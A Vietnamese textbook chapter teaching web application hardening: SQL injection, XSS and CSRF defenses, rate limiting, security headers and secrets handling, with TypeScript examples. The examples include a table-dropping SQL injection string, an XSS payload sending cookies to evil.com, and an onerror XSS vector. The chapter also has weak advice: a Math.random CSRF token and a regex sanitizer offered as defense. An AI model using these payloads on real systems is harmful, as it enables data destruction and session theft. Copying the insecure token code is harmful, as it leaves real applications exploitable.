# Chapter 40 — Application Security & Hardening

> **Bạn sẽ học được**:
> - OWASP Top 10 — 10 lỗ hổng phổ biến nhất
> - SQL Injection — parameterized queries trị tận gốc
> - XSS (Cross-Site Scripting) — sanitize + CSP
> - CSRF — SameSite cookies, tokens
> - Rate limiting — sliding window, chống brute force
> - Security headers — helmet, HSTS, CSP
> - Secrets management — env vars, Vault
>
> **Yêu cầu trước**: Chapter 39 (Auth basics).
> **Thời gian đọc**: ~45 phút | **Level**: Principal
> **Kết quả cuối cùng**: Hardened API — chống được các tấn công phổ biến.

---

Bạn biết castle defense (phòng thủ lâu đài) không? Một lớp tường = dễ phá. Lâu đài trung cổ có: hào nước (firewall), tường ngoài (WAF), tường trong (validation), cổng thành (auth), lính canh (monitoring). **Defense in depth** = nhiều lớp bảo vệ. Hacker phá được lớp 1 → gặp lớp 2 → gặp lớp 3.

OWASP (Open Web Application Security Project) duy trì danh sách **Top 10** lỗ hổng web phổ biến nhất — cập nhật mỗi vài năm. Danh sách này là "cẩm nang sinh tồn" cho mọi web developer. Biết OWASP Top 10 = biết 80% các tấn công sẽ gặp. Chương trước (Ch39) dạy PHÒNG VỆ CỔNG THÀNH (authentication + authorization). Chương này dạy PHÒNG VỆ TƯỜNG (hardening) — chống lại các tấn công cụ thể.

### Tại sao developer CẦN biết security?

Bạn có thể nghĩ: "Security là việc của team DevOps/Security." Sai. 80% lỗ hổng bắt nguồn từ CODE — SQL injection, XSS, CSRF — đều là lỗi CỦA DEVELOPER. DevOps có thể thêm firewall, WAF, monitoring — nhưng nếu code có SQL injection, firewall không cứu được.

---

## App Security & Hardening — OWASP Top 10 Defense

SQL Injection (parameterized queries). XSS (escape + CSP). CSRF (SameSite + tokens). Rate limiting (sliding window). Security headers (helmet). Secrets management (env vars, Vault). Defense in depth = nhiều lớp bảo vệ.


## 40.1 — SQL Injection

SQL Injection là một trong những lỗ hổng LÂU ĐỜI nhất (từ những năm 1990s) và vẫn nằm trong OWASP Top 10 ngày nay. Tại sao? Vì nó đơn giản tới mức đáng sợ: attacker nhập dữ liệu "đặc biệt" vào form, và dữ liệu đó trở thành MỘT PHẦN CỦA SQL QUERY. Hãy tưởng tượng: bạn hỏi thủ thư "tìm sách tên X", nhưng X = "Harry Potter'; DROP TABLE books; --". Nếu thủ thư nghe lệnh THEO NGHĨA ĐEN — toàn bộ kệ sách bị xóa.

Phòng chống? **Parameterized queries** — tách HOÀN TOÀN giữa SQL code và data. Database biết: phần nào là lệnh, phần nào là dữ liệu. ORMs (Prisma, Drizzle) tự làm điều này — lý do NÊN dùng ORMs thay vì raw SQL strings.

```typescript
// filename: src/security/sql_injection.ts
import assert from "node:assert/strict";

// ❌ VULNERABLE: string concatenation
// const query = `SELECT * FROM users WHERE email = '${email}'`;
// Attacker: email = "'; DROP TABLE users; --"
// Result: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
// 💀 TABLE DELETED!

// ✅ SAFE: parameterized queries
// const query = 'SELECT * FROM users WHERE email = $1';
// const result = await db.query(query, [email]);
// Database treats $1 as DATA, never as SQL code

// Simulate: parameterized vs concatenated
const sanitize = (input: string): string =>
    input.replace(/'/g, "''").replace(/;/g, "").replace(/--/g, "");

const maliciousEmail = "'; DROP TABLE users; --";

// Without parameterization:
const unsafeQuery = `SELECT * FROM users WHERE email = '${maliciousEmail}'`;
assert.ok(unsafeQuery.includes("DROP TABLE"));  // 💀 Injection!

// With sanitization (defense layer):
const sanitized = sanitize(maliciousEmail);
assert.ok(!sanitized.includes("DROP TABLE"));  // Blocked!

// But BEST: use parameterized queries (ORM does this automatically)
// Prisma: prisma.user.findUnique({ where: { email } })  ← SAFE
// Drizzle: db.select().from(users).where(eq(users.email, email)) ← SAFE

console.log("SQL Injection prevention OK ✅");
```

**Câu chuyện thực tế**: Năm 2008, Heartland Payment Systems bị SQL injection — 130 TRIỆU thẻ tín dụng bị lộ. Năm 2015, TalkTalk (UK telecom) bị tấn công — 157,000 khách hàng bị lộ data, công ty mất £60 triệu. Cả hai đều do SQL injection — lỗ hổng đã TỒN TẠI từ 1990s và có giải pháp BIẾT TỪ 1990s (parameterized queries). Tại sao vẫn xảy ra? Vì developer không biết hoặc không quan tâm.

> **💡 Quy tắc vàng**: KHÔNG BAO GIỜ nối string vào SQL query. LUÔN dùng parameterized queries hoặc ORM. Nếu bạn thấy `${variable}` trong SQL string — đó là BUG bảo mật.

---

## 40.2 — XSS & CSRF

**XSS** (Cross-Site Scripting): attacker chèn JavaScript vào trang web mà NGƯỜI KHÁC sẽ xem. Ví dụ: comment chứa `<script>` tag. Khi victim mở trang → script chạy → steal cookies, redirect, keylog. Phòng: escape HTML output + Content Security Policy (CSP) headers.

**CSRF** (Cross-Site Request Forgery): attacker lừa browser của victim gửi request tới trang web CỦA BẠN. Victim đã login bank.com → visit evil.com → evil.com có form ẩn POST tới bank.com/transfer → browser gửi kèm cookies → tiền mất! Phòng: SameSite cookies + CSRF tokens.

```typescript
// filename: src/security/xss_csrf.ts
import assert from "node:assert/strict";

// === XSS (Cross-Site Scripting) ===
// Attacker injects script into page that other users see
// ❌ innerHTML = userInput  ← script executes!
// Input: <script>fetch('evil.com?cookie='+document.cookie)</script>

// Defense 1: Escape HTML
const escapeHtml = (unsafe: string): string =>
    unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");

const malicious = '<script>alert("XSS")</script>';
const safe = escapeHtml(malicious);
assert.ok(!safe.includes("<script>"));
assert.ok(safe.includes("&lt;script&gt;"));

// Defense 2: Content Security Policy (CSP header)
// Content-Security-Policy: default-src 'self'; script-src 'self'
// Browser BLOCKS inline scripts and external scripts not from 'self'

// === CSRF (Cross-Site Request Forgery) ===
// Attacker tricks user's browser into making request to YOUR site
// User logged in to bank.com → visits evil.com →
// evil.com has: <form action="bank.com/transfer" method="POST">
// Browser sends bank cookies automatically! 💀

// Defense 1: SameSite cookies
// Set-Cookie: session=xxx; SameSite=Strict; HttpOnly; Secure
// Browser DOESN'T send cookie in cross-site requests

// Defense 2: CSRF token
// Server generates random token → embeds in form → validates on submit
const generateCsrfToken = (): string =>
    Array.from({ length: 32 }, () =>
        Math.floor(Math.random() * 36).toString(36)
    ).join("");

const token = generateCsrfToken();
assert.strictEqual(token.length, 32);

console.log("XSS & CSRF OK ✅");
```

**Tại sao XSS nguy hiểm hơn bạn nghĩ?** XSS không chỉ hiển alert box. Một script XSS có thể:
- **Steal session cookies** → attacker đăng nhập tài khoản của bạn.
- **Keylog** → ghi lại mọi thứ bạn gõ.
- **Deface trang** → hiển nội dung giả (phishing).
- **Mine crypto** → dùng CPU của victim.
- **Spread** → tự copy vào comment khác (worm XSS).

Năm 2005, Samy Kamkar tạo Samy Worm — XSS worm đầu tiên trên MySpace. Trong 20 giờ, nó lây nhiễm 1 TRIỆU profiles. Mỗi profile bị nhiễm lại lây tiếp cho bạn bè. Samy bị FBI điều tra.

> **💡 Quy tắc: Treatment at the boundary**. FP philosophy áp dụng: dữ liệu vào = PARSE (validate + sanitize). Dữ liệu ra = ESCAPE. Domain logic ở giữa làm việc với “dữ liệu đã sạch”. Giống Zod schema từ Ch14: parse, don't validate.

---

## ✅ Checkpoint 40.1-40.2

> Đến đây bạn phải hiểu:
> 1. **SQL Injection**: parameterized queries. ORMs = tự động safe
> 2. **XSS**: escape HTML output + CSP headers. KHÔNG BAO GIỜ `innerHTML = userInput`
> 3. **CSRF**: SameSite cookies + CSRF tokens. Protect state-changing requests
> 4. **Quy tắc chung**: treat input as UNTRUSTED, escape output, use established libraries
>
> **Test nhanh**: `<img src=x onerror="alert(1)">` — đây là loại tấn công gì?
> <details><summary>Đáp án</summary>**XSS!** Không cần `<script>` tag. `onerror` event handler cũng chạy JavaScript. Đó là lý do cần escape MỊI HTML characters, không chỉ `<script>`.</details>

---

## 40.3 — Rate Limiting & Security Headers

Rate limiting chống brute force (thử password liên tục), DDoS (quá tải server), và scraping (crawl data hàng loạt). Ý tưởng: giới hạn số requests per IP per time window. Vượt quá → block tạm thời.

Security headers thêm một lớp phòng thủ: browser đọc headers và TỰ BẢO VỆ. CSP ngăn inline scripts. HSTS bắt buộc HTTPS. X-Frame-Options chống clickjacking. `helmet` npm package thiết lập tất cả với MỘT dòng.

```typescript
// filename: src/security/rate_limiting.ts
import assert from "node:assert/strict";

// === Rate Limiting ===
// Prevent brute force, DDoS, scraping
// Strategy: sliding window per IP

type RateLimiter = {
    check: (ip: string) => { allowed: boolean; retryAfterMs?: number };
};

const createRateLimiter = (maxRequests: number, windowMs: number): RateLimiter => {
    const windows = new Map<string, number[]>();

    return {
        check: (ip) => {
            const now = Date.now();
            const timestamps = (windows.get(ip) ?? []).filter(t => now - t < windowMs);

            if (timestamps.length >= maxRequests) {
                const oldestInWindow = timestamps[0];
                return { allowed: false, retryAfterMs: windowMs - (now - oldestInWindow) };
            }

            timestamps.push(now);
            windows.set(ip, timestamps);
            return { allowed: true };
        },
    };
};

const limiter = createRateLimiter(3, 60_000);  // 3 requests per minute

assert.strictEqual(limiter.check("1.2.3.4").allowed, true);   // 1/3
assert.strictEqual(limiter.check("1.2.3.4").allowed, true);   // 2/3
assert.strictEqual(limiter.check("1.2.3.4").allowed, true);   // 3/3
assert.strictEqual(limiter.check("1.2.3.4").allowed, false);  // blocked!
assert.strictEqual(limiter.check("5.6.7.8").allowed, true);   // different IP = OK

// === Security Headers (helmet) ===
// import helmet from 'helmet';
// app.use(helmet());
// Sets: X-Content-Type-Options, X-Frame-Options, X-XSS-Protection,
//       Strict-Transport-Security, Content-Security-Policy, etc.

console.log("Rate limiting OK ✅");
```

### Secrets Management

Một lỗ hổng phổ biến khác: **lộ secrets**. API keys, database passwords, JWT secrets — KHÔNG BAO GIỜ hardcode trong code hoặc commit vào Git.

```typescript
// filename: src/security/secrets.ts
import assert from "node:assert/strict";

// ❌ BAD: hardcoded secrets
// const DB_PASSWORD = "super_secret_123";
// const JWT_SECRET = "my-jwt-secret";
// const STRIPE_KEY = "sk_live_abc123";

// ✅ GOOD: environment variables
// const DB_PASSWORD = process.env.DB_PASSWORD;
// const JWT_SECRET = process.env.JWT_SECRET;
// const STRIPE_KEY = process.env.STRIPE_KEY;

// Validate at startup (fail fast!)
const requireEnv = (name: string): string => {
    const value = process.env[name];
    if (!value) throw new Error(`Missing required env var: ${name}`);
    return value;
};

// In production: use secret managers
// - AWS: Secrets Manager, SSM Parameter Store
// - Azure: Key Vault
// - GCP: Secret Manager
// - Self-hosted: HashiCorp Vault
// - Simple: .env files (NEVER committed to Git!)

// .gitignore must include:
// .env
// .env.local
// .env.production

console.log("Secrets management OK ✅");
```

**Câu chuyện thực tế**: Năm 2021, Twitch bị leak toàn bộ source code lên Internet. Nếu secrets nằm trong code — tất cả API keys, database passwords, internal services vẫn an toàn vì chúng được lưu RIÊNG trong secret managers. Code leak != secret leak — NẾU bạn làm đúng.

GitHub có "Secret Scanning" — tự động phát hiện khi bạn commit AWS keys, Stripe keys, v.v. và cảnh báo. Nhưng đừng DỰA vào điều này — hãy không bao giờ đặt secrets vào code ngay từ đầu.

> **💡 Quy tắc**: Nếu bạn gõ một giá trị và NGHĨ "cái này không nên để người khác thấy" → đó là secret. Đưa vào env var.

---

## ✅ Checkpoint 40.3

> Đến đây bạn phải hiểu:
> 1. **Rate limiting**: sliding window per IP. 3 requests/min → block
> 2. **Security headers**: helmet = một dòng, nhiều lớp bảo vệ
> 3. **Secrets**: env vars, NEVER hardcode, secret managers in production
> 4. **.gitignore**: luôn có `.env*` patterns
>
> **Test nhanh**: Bạn commit API key vào Git rồi xóa trong commit sau — an toàn chưa?
> <details><summary>Đáp án</summary>**KHÔNG!** Git lưu LỊCH Sử. API key vẫn nằm trong commit cũ. Cần rotate key (tạo key mới, hủy key cũ) và dùng `git filter-branch` hoặc BFG Repo-Cleaner để xóa khỏi history.</details>

---

## 🏋️ Bài tập

**Bài 1** (5 phút): Nhận diện lỗ hổng

```typescript
// Nhận diện loại tấn công cho mỗi đoạn code:
// 1. const query = `UPDATE users SET name='${name}' WHERE id=${id}`;
// 2. element.innerHTML = comment;
// 3. const apiKey = "sk_live_abc123";
// 4. app.post("/transfer", (req, res) => { transfer(req.body.amount); });
```

<details><summary>✅ Lời giải Bài 1</summary>

```
1. SQL Injection — string concatenation in SQL. Fix: parameterized query
2. XSS — unsanitized user input in HTML. Fix: escapeHtml() or textContent
3. Secret leak — hardcoded API key. Fix: process.env.STRIPE_KEY
4. CSRF — no CSRF token on state-changing POST. Fix: SameSite + CSRF token
```

</details>

**Bài 2** (10 phút): Viết middleware security

```typescript
// Viết Hono middleware thực hiện:
// 1. Rate limit: 100 req/min per IP
// 2. Security headers: CSP, HSTS, X-Frame-Options
// 3. Request body size limit: 1MB
// 4. Validate Content-Type for POST requests
```

<details><summary>✅ Lời giải Bài 2</summary>

```typescript
import assert from "node:assert/strict";

// Simplified middleware chain
type Request = { ip: string; method: string; contentType?: string; bodySize: number };
type Response = { status: number; headers: Record<string, string>; body?: string };
type Next = () => Response;
type Middleware = (req: Request, next: Next) => Response;

// Rate limiter
const rateLimits = new Map<string, number[]>();
const rateLimit: Middleware = (req, next) => {
    const now = Date.now();
    const times = (rateLimits.get(req.ip) ?? []).filter(t => now - t < 60000);
    if (times.length >= 100) return { status: 429, headers: {}, body: "Too many requests" };
    times.push(now);
    rateLimits.set(req.ip, times);
    return next();
};

// Security headers
const securityHeaders: Middleware = (req, next) => {
    const res = next();
    res.headers["Content-Security-Policy"] = "default-src 'self'";
    res.headers["Strict-Transport-Security"] = "max-age=31536000";
    res.headers["X-Frame-Options"] = "DENY";
    return res;
};

// Body size limit
const bodyLimit: Middleware = (req, next) => {
    if (req.bodySize > 1_000_000) return { status: 413, headers: {}, body: "Payload too large" };
    return next();
};

const ok: Next = () => ({ status: 200, headers: {} });
const r1 = securityHeaders({ ip: "1.1.1.1", method: "GET", bodySize: 0 }, ok);
assert.ok(r1.headers["Content-Security-Policy"]);
assert.ok(r1.headers["Strict-Transport-Security"]);

const r2 = bodyLimit({ ip: "1.1.1.1", method: "POST", bodySize: 2_000_000 }, ok);
assert.strictEqual(r2.status, 413);

console.log("Security middleware OK ✅");
```

</details>

---

## 🔧 Troubleshooting

| Vấn đề | Nguyên nhân | Cách sửa |
|---|---|---|
| "Phát hiện SQL injection trong code review" | Nối string trong queries | Thay TẤT CẢ bằng parameterized queries hoặc ORM |
| "XSS dù đã escape" | Quên escape ở một template | Dùng framework auto-escape (React, Vue tự động) |
| "CSRF tấn công API" | API chấp nhận POST cross-origin | Thêm SameSite=Strict cookies + CSRF tokens |
| "Secrets trong lịch sử Git" | Vô tình commit .env | Rotate secrets ngay + BFG Repo-Cleaner |
| "Rate limit quá khắt" | IP chung (văn phòng/VPN) | Dùng kết hợp user ID + IP, điều chỉnh threshold |

---



## Tóm tắt

Chương này là "tường thành thứ hai" sau Ch39 (authentication). OWASP Top 10 là danh sách các lỗ hổng PHỔ BIẾN NHẤT — biết chúng = biết phòng thủ. Defense in depth = không bao giờ tin vào MỘT lớp bảo vệ. Validation + auth + headers + rate limiting + logging = nhiều lớp tường.

Điểm FP: Zod validation (Ch14) là defense in depth tại domain layer. Parse, don't validate. Dữ liệu qua Zod schema = ĐÃ AN TOÀN khi vào domain logic. TypeScript types + Zod = hai lớp bảo vệ tại biên.

- ✅ **OWASP Top 10**: SQL injection, XSS, CSRF — các tấn công phổ biến nhất.
- ✅ **Parameterized queries**: LUÔN LUÔN. ORMs tự động làm.
- ✅ **XSS**: escape HTML + CSP. **CSRF**: SameSite + tokens.
- ✅ **Rate limiting**: sliding window. **Headers**: helmet.
- ✅ **Defense in depth**: validation + auth + headers + rate-limit + monitoring.

## Tiếp theo

→ Chapter 41: **Distributed Systems Fundamentals** — CAP theorem, message queues, Saga, Circuit Breaker. Khi ứng dụng vượt ra ngoài MỘT server.
